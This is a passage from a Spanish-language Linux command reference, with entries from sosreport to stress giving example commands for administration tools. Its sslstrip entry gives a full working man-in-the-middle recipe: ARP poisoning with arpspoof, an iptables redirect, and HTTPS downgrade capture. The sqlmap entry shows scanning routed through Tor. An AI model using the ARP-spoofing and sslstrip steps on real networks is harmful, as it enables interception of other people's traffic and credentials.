Conjunto de herramientas que reúnen información sobre el sistema (hardware y configuración). La información puede ser utilizada para fines de diagnóstico y depuración.
# sosreport -l (listado de módulos)
# sosreport -n ntp,numa (desactivar los módulos ntp y numa)
# sosreport -k virsh=off (desactivar un módulo)
# sosreport -e virsh=on  (activarlo


source
Recarga o ejecuta el archivo de configuración indicado para aplicar cambios o el script de bash correspondiente.
$ source .bashrc
Este comando es equivalente a un punto [.]:
$ . .bashrc (lo mismo que el anterior)
$ source script.sh


sources.list
Archivo que contiene las fuentes o repositorios de los paquetes de software en las distros derivadas de Debian.
Generador de sources.list optimizado via web:
[http://debgen.simplylinux.ch/](http://debgen.simplylinux.ch/ "sources.list a la carta")
División del programario según Debian y Ubuntu:
DEBIAN:
main (Paquetes 100% libres según las directovas de Debian)
contrib (Paquetes que dependen de alguno que no es 100% libre según las directivas de Debian)
non-free (Paquetes que o bien no cumplen la directiva de Debian o no facilitan el código fuente)
UBUNTU:
main (Paquetes que cumplen los requisitos de la licencia de Ubuntu)
restricted (soportados por los desarrolladores de Ubuntu pero o bien no cumplen su licencia o no se tiene acceso al código fuente)
Universe (Programas mantenidos por la comunidad)
Multiverse (Programas comerciales o privativos de terceras empresas o fabricantes)


sox
[soxmix]. Manipular ficheros de audio. Soporta mp3, wav, ogg... [ver play]
$ soxmix 1.mp3 2.mp3 mezcla.mp3
$ sox archivo.mp3 (Obtener información)
$ sox archivo.mp3 rapido.wav speed 2.0 (Crear un audio a doble velocidad)
$ sox file.mp3 file2.mp3 trim 0 5 (corta los primeros 5 segundos de file.mp3 y los guarda en file2.mp3)
$ sox file.mp3 file.wav (pasar de mp3a wav)
$ sox 2.wav 3.wav speed 0.5 (3.wav irá a la mitad de velocitad que 2.wav)


spacedream
Muestra una imagen del cielo en la tty. Con las teclas del cursor permite moverse por entre la constelación de estrellas.
$ spacedream


speaker-test
Pruebas de sonido para dispositivos alsa.
$ speaker-test -c6 -t wav (probar altavoces usando voz [t])
$ speaker-test (básico)
$ speaker-test -Dplug:front -c2 (estereo)


spd-conf
Herramienta simple para la configuración básica de speech-dispatcher y diagnóstico de problemas. El paquete speech-dispatcher proporciona una capa independiente para síntesis de voz y salida por altavoces, es compatible con varios sintetizadores de voz (software y hardware) a través de los diferentes backends de las aplicaciones.
$ spd-conf -d -e (para mensajes y diagnosis de los problemas)
$ spd-conf -d --test-pulse (test de pulse audio)
s spd-conf -d --test-alsa (test de alsa)


speedometer
Monitor de transferencia de ficheros [velocímetro].
# speedometer -p -rx eth0  (tráfico recibido y el resultado en consola [-p])
# speedometer -tx eth0  (tráfico transmitido y el resultado en modo gráfico)
# speedometer -i 0.25 -rx eth0 (t. recibido, en modo gráfico y muestreo cada 0.25 segundos.)
pulsar “q” para cerrar


speedtest
[= speedtest-cli]. Medir la velocidad de conexión a internet directamente desde el terminal tanto de descarga como de subida.
$ speedtest (mostrar velocidad de descarga [download], de subida [upload] y la latencia [ping])
$ speedtest --simple (mostrar salida sin detalles. Sólo mostrará el ping, la velocidad de descarga y la velocidad de subida)
$ speedtest --bytes > resultados.txt (resultado en bytes y mandarlo a un archivo)
$ speedtest --list (muestra una lista de servidores de speedtest.net ordenados por distancia)
$ speedtest --server ID_server (seleccionar un servidor del listado anterior)
$ speedtest --csv (guardar los resultados en formato CSV)
$ speedtest --no-upload (sólo medir la velocidad de descarga)
$ speedtest --no-download (sólo medir la de subida)
$ speedtest --no-pre-allocate (probar la velocidad sin utilizar la geolocalización o la búsqueda de servidores cercanos)
$ speedtest --share (Nos da una URL con la imagen en png de la conexión)


spew
Medir el rendimiento de E/S de dispositivos de caracteres, dispositivos de bloque y archivos normales. También se puede usar para generar altas cargas de E/S para los sistemas de tensión mientras se verifica la integridad de los datos. No necesita archivos de configuración. Muestra la velocidad de transferencia de escritura en kibibytes por segundo y el tiempo de transferencia de escritura en segundos. Incluye gorge y regorge
$ spew -b 32k 1m /tmp/spewfile (escribe 32 mebibytes [1 mebibyte = 1048576 Bytes] en el archivo especificado)
$ spew -u m -i 10 -b 1k 256k /dev/sda1 (Escribe 256 kibibytes utilizando peticiones de 1 kibibibyte en el archivo de dispositivo de bloque /dev/sda1 10 veces utilizando el patrón predeterminado (aleatorio). Las tasas de transferencia de escritura iterativa y acumulativa se muestran en mebibytes por segundo y los tiempos de transferencia de escritura iterativa y acumulativa se muestran en segundos.)
$ regorge -s -o 1m -b 16m 1g /tmp/bigfile (Escribe 1 gibibyte (1 gibibyte = 1024*1024*1024 bytes) comenzando en un offset de 1 mebibyte usando 16 peticiones de mebibyte al fichero /tmp/bigfile usando el patrón por defecto (aleatorio). Los datos se escriben de forma sincrónica y se vacían al cerrar el archivo. Luego se leen los mismos datos usando el mismo tamaño de petición y offset. Se comprueba que los datos leídos coinciden con los leídos. Las tasas de transferencia de escritura y lectura se muestran en kibibytes/segundo. Los tiempos de transferencia de lectura y escritura se muestran en segundos.)
$ gorge -i 0 -u M -p zeros -b 512 1m /dev/zero (Lee 1 mebibyte de datos utilizando peticiones de 512 bytes del archivo /dev/zero un número infinito de veces utilizando el patrón de ceros (no comprueba los datos). Las tasas de transferencia de lectura iterativa y acumulativa se muestran en megabytes (1 megabyte = 1.000.000 bytes) por segundo y los tiempos de transferencia de lectura iterativa y acumulativa se muestran en segundos.)
$ regorge -g -r -b 1k -B 256K 1t /dev/md1 (Escribe 1 tebibyte (1 tebibyte = 1024*1024*1024*1024 bytes) utilizando peticiones de 1-256 kibibytes en el dispositivo de bloques /dev/md1 utilizando el patrón aleatorio. Se realizan búsquedas aleatorias antes de cada transferencia, pero cada bloque entre el inicio y el final de los datos se escribe exactamente una vez. Los tamaños de las peticiones se eligen aleatoriamente. A continuación se leen los mismos datos utilizando los mismos tamaños de petición y búsquedas en la misma secuencia. Repita la secuencia anterior un número infinito de veces hasta que se le indique que abandone [mediante señal o comando TUI])


split
Cortar archivos
$ split -d -b 5M archivo otro_archivo. (Que tengan extensión con números: .00, .01, .02 [-d]. Trozos de 5 MB [-b], archivo de entrada y de salida terminado con un punto donde se añade la extension. En este ejemplo daría salidas tipo otro_archivo.00, otro_archivo.01....)
$ split -l 100 archivo (dividirlo en trozos de 100 lineas)
$ split -a 3 -d -b 5M archivo (que los trozos lleven 3 digitos [-a])
$ split -n 4 archivo (dividirlo en 4 partes)
$ cat prefijo* > archivo  (volver a unirlos)


split-logfile
Los archivos de registro se crearán, en el directorio donde se ejecuta el script, para cada nombre de host virtual que aparezca en el archivo de registro combinado. Estos archivos de registro llevarán el nombre del nombre del host, con una extensión de archivo.log. El archivo de registro combinado se lee desde la entrada estándar. Los registros leídos se añadirán a cualquier archivo de registro existente.
# split-logfile < /var/log/apache2/access.log (creará un archivo para cada ip distinta que encuentre en access.log por lo que es mejor lanzar el comando en un dir vacio)


splitvt
Lanzar dos shells simultaneas partiendo en dos ventanas una terminal.
$ splitvt -t "linux es genial" -upper ls -lower top (Con un título [-t] lanzando un ls en la ventana superior y top en la inferior)


sponge
[moreutils]. Herramienta que guarda todo el contenido a escribir hasta que recibe el EOF y luego lo escribe por lo que permite procesar un fichero y reescribirlo en el propio fichero sin perdida de datos.
$ tac archivo | sponge archivo (Lee al reves un archivo y lo guarda en el mismo archivo)
$ column -t datos | sponge datos


spumux
Generar subtítulos en un video mpeg.
$ spumux -s0 subt.xml < video.mpeg > video_subtitulado.mpeg
Nota.- El archivo subt.xml con un contenido:
	<subpictures>
	   <stream>
	        <textsub filename="SUBTITULOS.srt" characterset="ISO8859-1"
	                 fontsize="24.0" font="Arial.ttf" horizontal-alignment="center"
	                 vertical-alignment="bottom" left-margin="60" right-margin="60"
	                 top-margin="20" bottom-margin="30" subtitle-fps="25"
	                 movie-fps="29.97" movie-width="720" movie-height="478"/>
	   </stream>
	</subpictures>
La fuente Arial.ttf ha de estar [o tener un enlace] en el directorio ~/.spumux


sqlite
Gestor de bases de datos.
$ sqlite (entrar en el prompt)
sqlite> .help (mostrar comandos para usar)
sqlite> .database (ver las bases de datos existentes)
sqlite> .tables (ver las tablas de las que constan en la base de datos)
sqlite> .schema nombre (ver conceptes de la tabla "nombre")
sqlite> drop table nombre; (eliminar una tabla)
sqlite> .quit (salir de sqlite)
sqlite> select * from nombre; (muestra los datos de la tabla "nombre")
sqlite> .mode tabs nombre (La proxima vez que se lance el comando anterior mostrará la tabla tabulada)
sqlite> .headers on (si queremos mostrar el nombre de cada columna)
1- Un ejemplo de creación de una tabla:
	sqlite> CREATE TABLE Datos (
	...> id integer primary key autoincrement,
	...> Apellido char(30) not null,
	...> Nombre char(30) not null,
	...> Observaciones char(60));
Nota.- id es un número que se va ingrementando con cada entrada y entre parentesis los espacios reversados para cada dato.
	sqlite> insert into Datos(Nombre, Apellido, Observaciones) Values('juan', 'Sanchez', 'Un amigo de la infancia');
	sqlite> insert into Datos(Nombre, Apellido, Observaciones) Values('josé Antonio', 'Rodriguez', 'Primo de mi tio Carlos');


sqlmap
Provee automatismos para testear la seguridad entre una aplicación web y la base de datos con la que interactúa. Descarga:
	$ git clone git://github.com/sqlmapproject/sqlmap.git
	$ cd sqlmap
$ python sqlmap.py -u "http://una_url.com" (forma básica)
$ python sqlmap.py --tor --tor-type=SOCKS5 --check-tor -v -u "http://una_url.com"
Algunas opciones:
--tor --tor-type=SOCKS5 (que use la red Tor para las peticiones)
--check-tor (comprobar si Tor se usa correctamente)
-v 6 (con la máxima información. Por defecto 1. Máximo 6)
-a (Recuperar todo)


squid
Proxy caché (intermediario para nuestra conexion a internet, guardando las paginas visualizadas en una caché)
# cp /etc/squid3/squid.conf{,.defaults} (Realizar copia de seguridad de la configuración)
# nano /etc/squid3/squid.conf
Modificamos/adaptamos los siguientes ajustes basicos:
http_port 3128 #puerto de escucha
cache_mem 100 MB #Tamaño memoria caché
cache_dir ufs /var/spool/squid 700 16 256 #directorio y tamaño
acl NuestraRed src 192.168.1.0/24 #Nombre y red a la que afecta
http_access allow NuestraRed #permitir acceso a toda la red
http_access allow deny all #Denegamos a los de fuera de la red
auth_param basic /usr/lib/squid/ncsa_auth /etc/squid/passwd #ruta a usuarios
auth_param basic realm “Mensaje de acceso” #mensaje al logearse
auth_param basic children 5 #Procesos de autentificación
auth_param basic basic credentialsttl 1 hours #tiempo
# squid3 -k parse (Revisión de la sintaxis del archivo squid.conf)
Después de las modificaciones reiniciar servicio:
# /etc/init.d/squid3 restart
Configuración de usuarios (/etc/squid/passwd):
# htpasswd -c /etc/squid3/passwd user1 (Crear archivo [-c] nombre de usuario y pedirá contraseña)
# htpasswd /etc/squid3/passwd usuario2 (Sin parámetro -c porque el archivo ya está creado. Otro usuario y contraseña)


srm
[secure-delete]. Aplicación para eliminar de forma segura datos de disco sobreescribiendo su espacio. Es de funcionamiento lento, pero por eso se le considera el más efectivo
$ srm -f dir (Modo rápido i el más inseguro)
$ srm -l dir (Como realizar dos veces srm -f)
$ srm archivo.txt (Se sobreescribe 38 veces)
$ srm -rzv dir (se sobreescriben 38 veces los archivos y subdirectorios incluidos [r], sobreescribnedo ceros en el último borrado [z] y mostrando el proceso [v])


srptool
[gnutls]. Programa simple que emula los programas de las librerías SRP (Secure Remote Password).  Está pensado para su uso en lugares donde no se espera que la autenticación SRP sea la utilizada por los usuarios del sistema. Para utilizar SRP es necesario crear dos ficheros, el archivo de contraseñas que contiene los usuarios y los verificadores asociados a ellos y el archivo de configuración que contiene los parámetros del grupo.
# srptool --create-conf /etc/tpasswd.conf (crear el archivo de configuración)
# srptool --passwd /etc/tpasswd --passwd-conf /etc/tpasswd.conf -u root (creará /etc/tpasswd y añadirá el usuario root. Pedirá contraseña)
# srptool --passwd /etc/tpasswd --passwd-conf /etc/tpasswd.conf --verify -u root (entrar contraseña y verificar si coincide con la entrada en /etc/tpasswd obtendrá)


ss
Utilidad para investigar sockets. Sustituye a netstat.
# ss -r (resolviendo las IPs)
# ss -4 (muestra las conexiones IPv4)
# ss -ta (conexiones TCP)
# ss -ua (conexiones del protocolo UDP)
# ss -n (sin resolver)
# ss  (muestra todas las direcciones y puertos tanto en modo escucha como no)
# ss -l (muestra los que estan esperando conexión)
# ss -ltn (muestra los sockets TCP que estan en "listen" [escucha])
# ss -lun (muestra los sockets UDP que estan en "listen")
# ss -o (con conexión establecida)
# ss -p (con la aplicación que los motiva)
# ss -a | grep ssh (De todas las conexiones, solo muestra las ssh)
# ss -s (estadísticas generales)
# ss -tpan 'sport = :22' (ver conexiones por el puerto 22)
# ss -n dst :443 (muestras las del puerto 443)
# ss -o state established '( dport = :https )' (muestra las conexiones https)


sscg
Crea certificados "autofirmados" más seguros.
     $ sscg --country=ES --state=Girona --locality=Olot --organization=lapipaplena
     Wrote service certificate key to /home/USER/service-key.pem
     Wrote service certificate to /home/USER/service.pem
     Wrote CA certificate to /home/USER/ca.crt
     Wrote Diffie-Hellman parameters to /home/USER/dhparams.pem


ssconvert
[gnumeric]. Conversor de formatos de hoja de cálculo por línea de comandos.
$ ssconvert --list-exporters (Listado de conversiones de salida)
$ ssconvert --list-importers (Litado de conversiones de entrada)
$ ssconvert entrada.xls salida.csv (De formato excel a csv)
$ ssconvert -E utf-8 entrada.xls salida.csv (Especificando una codificación para la salida)
$ ssconvert --export-type=Gnumeric_stf:stf_assistant -O 'separator=| format=preserve charset=unicode' entrada.xls salida.csv (Especificando opcionalmente un exportador [--export-type] que permite exportar a txt, especificando un separador de campos que no sea el por defecto [el espacio] sinó la barra vertical [|], preservando el formato de las celdas del original [format], otras opciones de format son "automatic" [por defecto] y "raw" [sin formato] y con codificación de salida en unicode [por defecto UTF-8])


ssed
Versión mejorada de GNU sed [ver] con algunos argumentos nuevos.


ssft
Biblioteca de funciones de Shell. La biblioteca define un conjunto de varias funciones y ha sido diseñada para usarse obteniendo el código de la biblioteca de otros scripts. El ejecutable incorpora .sh.
$ ssft.sh -d (listado de funciones diponibles)
$ ssft.sh -d ssft_file_selection (descripción de una función)


ssh
Comunicación cifrada entre dos máquinas.
$ ssh usuario@host (básica)
$ ssh -v usuario@IP_o_host (comprobar errores en una conexión)
$ ssh -p 4000 usuario@host (especificando un puerto)
$ ssh -fND localhost:2080 usuario@host (Crear un servidor proxy en una máquina remota. La “N” es para que no se puedan ejecutar comandos)
$ ssh -X -Y usuario@host akregator (Lanzar una aplicación remota en local. Ver punto 11 de esta entrada)
$ ssh usuario@host ls (lanzar un comando remoto y visualizarlo en local)
$ ssh -t usuario@host newsbeuter  (lo mismo si precisa consola)
$ ssh -D 9999 usuario@host (abrir un puerto a partir del cual tunelar una conexión)
$ ssh user@host_ip 'DISPLAY=":0.0" import -window root screenshot.png' (realizar pantallazo de una sesión remota. Se archiva en el remoto no en local)
$ ssh usuario@host "tar -cf - /home/usuario/dir" | gzip dir.tar.gz (Comprimir un directorio remoto)
$ ssh usuario@host cat /home/usuario/archivo.txt | xclip -selection (Copiar el contenido de un archivo remoto en el clipboard local)
$ ssh -o "StrictHostKeyChecking no" usuario@host (Evitar verificación de known host al conectar)
# gedit /var/run/motd   (modificar el mensaje de bienvenida de ssh)
1.-
conexión remota. El servidor ha de tener el archivo /etc/ssh/sshd_config con los siguientes parámetros:
AllowTcpForwarding yes
GatewayPorts yes
Luego configurar Firefox para usar un servidor proxy 127.0.0.1 puerto 9999.
2.-
Modificar el mensaje antes del login
# gedit /etc/issue.net   (Para activarlo, descomentar del archivo “/etc/ssh/sshd_config” la línea: Banner /etc/issue.net)
3.-
Tunel inverso:
$ ssh -R 10000:localhost:22 usuario2@host2 (lanzado desde host1 hacia host2 crea un tunel por el puerto 10000)
$ ssh usuario2@host2 (Lanzado desde host3 hacia host2)
Una vez entrado en host2, lanzar:
$ ssh usuario1@localhost -p 10000 (Para conectar el host3 con el host1)
Otro caso de tunel inverso:
host1 no tiene acceso al router y lanza:
$ ssh -N usuario@host2 -R 2222:127.0.0.1:22 (hacia el host2 para crear un tunel por el puerto 2222)
$ ssh usuario@host2 (Usuario host3 se conecta a host2)
$ ssh usuario@127.0.0.1 -p 2222 (Y una vez entrado en host2 se conecta por el tunel a host1)
Nota.- Si host2 no corriera por el puerto 22 substituir por: usuario@host2 -p PUERTO
4.-
Crear clave publica para acceder a un remoto sin que pida identificación:
$ ssh-keygen -b 4096 -t rsa  (Crear la clave)
$ ssh-copy-id usuario@IP_o_HOST (enviar la clave al remoto)
En caso de tener la conexión en un puerto distinto:
$ ssh-copy-id -p 7000 USER@HOST
5.-
Para deshabilitar el acceso a todos los usuarios excepto a root:
# touch /etc/nologin
# chmod 644 /etc/nologin
6.-
Deshabilitar/personalizar los mensajes que aparecen cuando nos logueamos en algunas distros a un host remoto mediante SSH.
$ touch /home/usuario/.hushlogin (Creando este fichero vacio se deshabilitan los mensajes. Borrandolo vuelven a aparecer)
# nano /etc/motd (Archivo para personalizar los mensaje de bienvenida a quien se loguea en el sistema)
7.-
Crear un atajo para la conexión a servidores remotos:
$ nano .ssh/config
Y pegar el siguiente contenido debidamente modificado con nuestros datos referente e dos host remotos:
	host servidor
	 hostname 192.168.1.10
	 port 22000
	 user USUARIO_SERVIDOR
	host maquina1
	 hostname 192.168.1.15
	 port 22100
	 user USUARIO_MAQUINA1
Nota.- Delante de las lineas hostname, port y user existe un espacio.
Al crear este archivo, la conexión se realizará con:
$ ssh servidor (Pedirá igualmente contraseña)
$ ssh maquina1
8.-
Evitar desconexiones por inactividad:
$ nano .ssh/config
Y pegar el siguiente contenido:
	Host *
	    ServerAliveInterval 120
	    ServerAliveCountMax 3
9.-
Añadir un registro de las acciones realizadas dentro de cada sesión SFTP
# nano /etc/ssh/sshd_config
Y dejar la linea como se indica:
Subsystem sftp /usr/lib/openssh/sftp-server -l INFO
Tras reiniciar ssh, el registro se plasmará en /var/log/auth.log
10.-
Aumentando la seguridad del servidor ssh:
# nano /etc/ssh/sshd_config
Y añadir o modificar las siguientes lineas:
	AllowUsers juan pedro andrés (Limitando a uno o varios los usuarios autorizados)
	AllowGroup oficina (Restringir acceso a solo un grupo)
	Port 372 (Modificando puerto. Aconsejable uno inferior al 1024)
	LoginGraceTime 40 (Mostrar la pantalla de login 40 segundos antes de cerrarse)
	MaxStartups 4 (Cantidad máxima de conexiones simultaneas)
	MaxAuthTries 3 (Limitar el número de intentos de logeo, tras los cuales se cierra la conexión)
11.-
Ajustes para tunelar aplicaciones gráficas:
En el servidor:
# nano /etc/ssh/sshd_config
	AllowTcpForwarding yes
	X11Forwarding yes
	X11DisplayOffset 10
	X11UseLocalhost yes
En la máquina cliente:
# nano /etc/ssh/ssh_config
	ForwardX11 yes
	ForwardX11Trusted yes
Después de reiniciar ssh, con el parámetro -X se visualizará la gui remota que tambien tiene que estar instalada en local.
$ ssh -X usuario@host akregator


sshd
Demonio ssh
$ sshd -t (Verificar si existen errores en el archivo de configuración)


sshfs
Montar un sistema de archivos remoto en local.
# sshfs usuario@host_o_IP:/home/usuario /home/usuario/remoto
# fusermount -u /home/usuario/remoto  (Desmontarlo)


sshguard
Demonio que protege SSH y otros servicios contra ataques de fuerza bruta. Funciona observando los cambios en /var/log/auth.log, verificando si alguien esta fallando varias veces al autentificarse. Luego de varios errores de autentificacion (por defecto 14) el host ofensivo sera bloqueado por 7 minutos y se duplicará cada vez que el host ofensivo repita el ataque. Carece de archivo de configuración y puede complementarse con iptables:
# iptables -A INPUT -j sshguard (Para activarlo en todos los puertos)
# iptables -A INPUT -m multiport -p tcp --destination-ports 21,22 -j sshguard (Para puertos concretos [ftp y ssh])
El archivo para colocar las direcciones no afectadas por sshguard:
# nano /etc/sshguard/whitelist
Con el siguiente formato:
	192.168.1.53 (Una ip)
	192.168.1.0/24 (Un rango)
	lapipaplena.net (Un host)


ssh-keygen
Creación, gestión y conversión de claves utilizadas para la autenticación de cliente y servidor. Cuando no se especifica ninguna opción, ssh-keygen genera un par de claves RSA de 2048 bits y solicita un nombre de clave y una frase de paso para proteger la clave privada. Las claves públicas se crean usando el mismo nombre base que la clave privada con una extensión .pub añadida. La ubicación de la clave se muestra cuando se completa la generación de claves. Ver ssh
$ ssh-keygen -lvf ~/.ssh/known_hosts (Ver todas las huellas digitales y las imágenes randomart)
$ ssh-keygen -t rsa -C newserver -f .ssh/newkey (Generar el par de llaves publica y privada. Caso de exitir preguntará si se sobreescribe)
$ ssh-keygen -B -f .ssh/id_rsa.pub (Muestra la huella digital de la llave especificada en formato SHA-1)
$ ssh-keygen -f "$HOME/.ssh/known_hosts" -R [La_URL.com_entre_corchetes]:22 (Suprimir un clave de un host por sufrir alguna modificación y el puerto)
$ ssh-keygen -R HOST (Otra forma de suprimir una clave de un host modificado)
1.-
Para ver la huella digital cada vez que se ingresa en un host remoto:
# nano /etc/ssh/ssh_config
Descomentar la linea y dejarla:
VisualHostKey yes


sshpass
La contraseña para acceder por ssh a un host remoto se realiza de forma interactiva (entrándola por teclado) en algunos casos esto no es posible ya sea por tratarse de un script en el que se entra en un host remoto, se realiza alguna acción y se regresa al local o por que se precisa entrar la contraseña de forma no interactiva. Para estos casos puede ser útil este comando aunque considerando lo debil para la seguridad que entraña su uso ya que puede quedar registrado en "history".
$ sshpass -f file_pas ssh -y usuario@host ifconfig (Ejecuta ifconfig en el remoto entrando como contraseña la primera palabra del archivo file_pas )
$ sshpass -p 1234 ssh -t usuario@host "echo 1234 | sudo -S namp 192.168.1.0/24" (Ejecuta el comando "sudo nmap" en el host remoto que tiene por contraseña 1234.)


sshuttle
Levanta VPNs con SSH y enruta tráfico a través de ellos
# sshuttle -r usuario@servidor 0/0 (Ejecución básica para redireccionar la totalidad del tráfico)
# sshuttle --dns -vvr usuario@servidor 0/0 (que las consultas DNS sean procesadas a través del servidor DNS del servidor al que se está conectado)
# sshuttle --daemon usuario@servidor 0/0 --exclude 192.168.1.0/24 --exclude 90.173.123.64 (ejecutar el proceso en segundo plano y excluir una rango y una ip)


sslstrip
Herramienta para engañar al usuario haciéndole pensar que se encuentra en un sitio de Internet con cifrado SSL [HTTPS], cuando en realidad todos los datos están siendo transmitidos en abierto [HTTP].
Configuración de reenvío de paquetes IP:
# echo 1 > /proc/sys/net/ipv4/ip_forward
Envenenamiento ARP (paquete dsniff):
# arpspoof -i eth0 -t ip_victima ip_router
En caso de querer atacar toda la red, solo especificar la ip router:
# arpspoof -i eth0 ip_router
Redirección de puertos usando Iptables:
# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 31715
Al reiniciar el ordenador se borrará la regla, si se quiere borrar al momento cambiar "-A" por un "-D" en el comando anterior.
Arrancar sslstrip y ponerlo a la escucha:
# sslstrip -k -f -l 31715 -w archivo.log
Visionar en tiempo real los paquetes capturados:
#  tail -f archivo.log


ssmtp
[mailutils]. Herramienta que permite enviar correos a partir de un servidor externo (p.g gmail). Como remitente constará "root" ya que, en algunas distros, es quien tiene que enviar los correos. Ajustes en el archivo de configuración:
# nano /etc/ssmtp/ssmtp.conf
Modificar las lineas:
	root=correo@gmail.com
	mailhub=smtp.gmail.com:587
	hostname=el_hostname
	UseSTARTTLS=YES
	AuthUser=correo@gmail.com
	AuthPass=Contraseña_del_usuario_de_gmail
A continuación establecer permisos:
# chmod 640 /etc/ssmtp/ssmtp.conf
# chown root:mail /etc/ssmtp/ssmtp.conf
Lanzar la aplicación:
# ssmtp fulano@hotmail.com
Y colocar el texto:
	To: fulano
	Subject: Asunto
	---- Una linea en blanco ----
	El cuerpo de texto del correo
	Hasta la proxima.
Ctrl+d para terminar. Cuando vuelva a salir el prompt del sistema es que el mensaje ya se ha enviado.


sswap
[secure-delete]. Borrado seguro de swap. Previamente desactivar con swapoff /dev/sda7 y al finalizar el proceso volver a activarla con swapon /dev/sda7 [Si no sabemos donde se encuentra la swap: cat /proc/swaps. Argumentos paracidos a srm [ver] y sfill [ver]. El espacio se sobreescribe 38 veces.
$ sswap -f /dev/sda7 (Modo rápido e inseguro)
$ sswap -lv /dev/sda7 (Como lanzar dos veces sswap -f y mostrando el proceso)


st
Terminal simple.
$ st -t Reiniciar -e sudo init 6 (Abrir un terminal st con título para entrar la contraseña y reiniciar)


stalonetray
Applet para albergar el area de notificación.
$ stalonetray -bg #A78B5C -d title -geometry 6x1-0+0 -i 30 (con el color especificado [-bg], decoración de ventana [-d], las medidas [6x1] y la situación en pantalla [-0+0, abajo, derecha])
Algunas opciones:
-d	(none, title, border, all)
situación:
Abajo a la izquierda	5x1+0-0
Abajo en el centro (1024x768) + 20 píxeles elevado	5x1-450-20
Abajo a la derecha	5x1-0-0
Arriba a la izquierda	5x1+0+0
Arriba a la izquierda + 20 píxeles descendido	5x1+0+20
Arriba en el centro (1024x768)	5x1+450+0
Arriba a la derecha	5x1-0+0
Arriba a la derecha + 20 píxeles descendido	5x1-0+20
Abajo a la izquierda + 20 píxeles elevado	5x1+0-20


starship
Un promt para la terminal escrito en Rust, mínimo, rápido y personalizable. Descargar:
   $ curl -fsSL https://starship.rs/install.sh | bash
Para incorporarlo a bash entrar en ~/.bashrc la linea:
   eval "$(starship init bash)"
Y recargar:
  $ source ~/.bashrc


startlxde
Iniciar sesión de escritorio LXDE. Por defecto, carga openbox, lxpanel, pcmanfm, dbus-launch y lxsession.
$ startlxde


startx
Arrancar sistema gráfico
$ startx -- :1 (una segunda sesión gráfica accesible en ^Alt + F8)


stat
Estadísticas de archivo, directorios y sistemas
# stat /etc/passwd
# stat -c '%A %a' /etc/passwd (Mostrar los permisos de forma clásica i en formato octal)
# stat /usr
# stat -f /
$ stat -c "%s" archivo (medida del archivo)
$ stat -c '%n %U:%G-%a' * (Mostrar nombre archivo, propietario, grupo y permisos en formato octal)
$ stat / | awk '/Naixement: /{print $2 " " substr($3,1,5)}' (fecha de instalación del sistema)
Nota.- Si la instalación fue en castellano sustituir "Naixement" por "Creación" o "Bird" si en inglés)


status
Verifica si un servicio está activo o no.
$ status ssh


stdbuf
Ejecutar comandos con operaciones modificadas para almacenamiento en búfer.
$ tail -f /var/log/apache2/access.log | stdbuf -oL cut -d ' ' -f1 (ver accesos únicos)
$ stdbuf -o 0 ls
$ stdbuf -o0 -e0 ls >> log_file


stdsyslog
La utilidad ejecuta un programa, lee todo lo que genera en un conjunto de descriptores de archivos y los muestra de forma predeterminada por la salida estándar y error estándar y lo registra en el registro del sistema [/var/log/syslog o si existen errores en /var/log/error].
$ stdsyslog -l (lista los niveles de syslog disponibles)
$ stdsyslog -p archivo (archivo en el que escribir el ID)
$ stdsyslog -p archivo -d 1:alert -d 2:crit -d 3:info programa


steghide
Detectar y extraer mensajes incrustados dentro de una imagen o música
$ steghide embed -cf imagen.jpg -ef archivo_texto  (incrustar un texto en una imagen)
$ steghide embed -cf archivo.wav -ef archivo_texto (incrustar un texto en un archivo de música)
$ steghide extract -sf imagen.jpg  (extraer el archivo incrustado)


sticky
Cuando todos los ficheros del directorio solo pueden ser modificables por sus propietarios, naturalmente dejando a parte a root.
       $ ls -ld /tmp
       drwxrwxrwt 20 root root 540  4 d’oct.   12:18 /tmp
Se muestra con la última "t" en lugar de la "x" en los permisos de grupo.


stjerm
Consola tipo guake.
$ stjerm -k f12 -s left -o 70 -h 250 -w 1280 (Que aparezca pulsando F12, con barra de escroll a la izquierda, opacidad del 70% y especificando ancho y largo)
Algunas opciones:
-ah (Ocultar automáticamente la ventana cuando no está enfocada)
-bg red (Color de fondo)
-bgimg imagen.png (Establecer una imagen de fondo)
-fn (Tipo y tamaño de fuente)
-fg blue (Color de la fuente)
-p (Posición de la ventana [valores: top, bottom, left, right])


stow
Es un administrador de instalación de software para /usr/local. Usando enlaces simbólicos, Stow ayuda a mantener las instalaciones separadas (/usr/local/stow/emacs vs. /usr/local/stow/perl, por ejemplo) mientras mantiene que todas están bajo /usr/local. Incluye la aplicación chkstow.
$ echo "alias stow='sudo STOW_DIR=/usr/local/stow /usr/bin/stow'" >> ~/.bashrc
$ source ~/.bashrc
Si vamos a instalar, por ejemplo emacs, los descargamos y compilamos:
$ ./configure --prefix=/usr/local/stow/emacs
$ make
# make install
La instalación crea un enlace simbólico de /usr/local/bin/emacs a /usr/local/stow/emacs/bin/emacs.
$ stow emacs (informar a stow de la instalación)
$ stow -R emacs (actualizar la aplicación instalada)
$ stow -D emacs (desinstalar)
# rm -r /usr/local/stow/emacs (eliminar su directorio)
# stow -D emacs-21.3 -S emacs-21.4a (actualizar una versión de emacs)
$ chkstow (de vez en cuando limpiar el árbol de destinos)
$ chkstow -b (Comprueba el directorio de destino en busca de enlaces simbólicos falsos [que apuntan a archivos inexistentes])


strace
Muestra las llamadas al sistema originadas por un proceso.
$ strace comando
$ strace -p PID (Por número de proceso)
$ strace -c comando -o traza.txt (mostrar resumen de llamadas y errores durante la ejecución y redirigido a un archivo)
Algunas opciones:
-f (Incluir posibles forks que haga un programa, por ejemplo httpd)
-v (Muestra el máximo de información)
-s 8192 (Valor de 8192 como limite de longitud de las cadenas. Por defecto 32)


streamer
Herramienta para capturar imágenes individuales o múltiples de un video y grabar películas desde un dispositivo.
$ streamer -o captura.ppm  (capturar un frame)
$ streamer -t 10 -r 2 -o capturas.jpeg (capturar 10 frames y 2 por segundo)
$ streamer -t 0:30 -F stereo -o soundtrack.wav (grabar 30 segundos con sonido estereo)


streamripper
Ripear a partir de emisoras icecast (www.icecast.com) y showcast (www.showtcast.com). Crea una carpeta en el presente directorio.
$ streamrippwer http://yp.shoutcast.com/sbin/tunein-station.pls?id=321414 -l 4000 (grabar durante 4000 segundos)


stress
Herramientas para realizar un test de carga del sistema.
# stress -c 8 -i 4 -m 2 --vm-bytes 128M -t 20S
Opciones:
-c (8 multiples ciclos infinitos de raices cuadradas para la cpu)
-i (Introduce 4 ciclos infinitos que ejecutan la llamada al sistema sync())
--hdd-bytes 3G (carga de escritura en disco de 3G. Opciones: B,K,M,G)
